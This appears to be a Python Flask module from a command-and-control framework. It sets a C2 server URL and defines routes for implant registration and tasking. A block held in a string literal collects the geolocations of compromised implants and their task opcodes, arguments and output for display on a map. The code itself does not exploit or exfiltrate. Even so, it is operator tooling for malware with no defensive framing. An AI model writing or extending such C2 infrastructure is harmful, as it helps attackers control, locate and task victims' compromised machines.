from flask import Blueprint, session, render_template, redirect, url_for 
from cvnt.client_pb2 import *
from cvnt.db_operations import make_task, get_list, get_implant_by_id
from cvnt.tables import Task

client = Blueprint('client', __name__, template_folder='templates')
c2 = "https://rigmalwarole.com"
task_list = "/client/task/list"
task_create = "/client/task/create"
register = "/client/register"
request = "/client/request"
response = "/client/response"
packet = "/client/packet"

@client.route('/client', methods=['GET', 'POST'])
def index():
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('basic.login_success'))
    '''
    # Fetch latitude and longitude values from your Flask app
    implants = get_list()
    implant_coordinates = []
    for implant in implants[1:]:
        current_implant = get_implant_by_id(implant)
        coordinates = (current_implant.latitude, current_implant.longitude, current_implant.implant_id)
        implant_coordinates.append(coordinates)
    # Create a list to hold tasks and their characteristics for each implant
    implant_tasks = []
    for implant_id in implants[1:]:
        # Retrieve tasks for the current implant
        tasks = get_tasks_by_implant_id(implant_id)
        
        # Append tasks to the list
        implant_tasks.append({'implant_id': implant_id, 'tasks': tasks})
    
    return render_template('index.html', implant_coordinates=implant_coordinates, implant_tasks=implant_tasks) 

def get_tasks_by_implant_id(implant_id):
    try:
        # Query the database to retrieve tasks associated with the given implant_id
        tasks = Task.query.filter_by(implant_id=implant_id).all()

        # Convert the tasks to a list of dictionaries
        task_list = []
        for task in tasks:
            task_info = {
                'task_id': task.task_id,
                'status': task.status,
                'task_opcode': task.task_opcode,
                'task_args': task.task_args,
                'task_output': task.task_output
            }
            task_list.append(task_info)

        return task_list
    except Exception as e:
        # Handle exceptions (e.g., database errors)
        print(f"Error occurred while fetching tasks for implant {implant_id}: {e}")
        return []
'''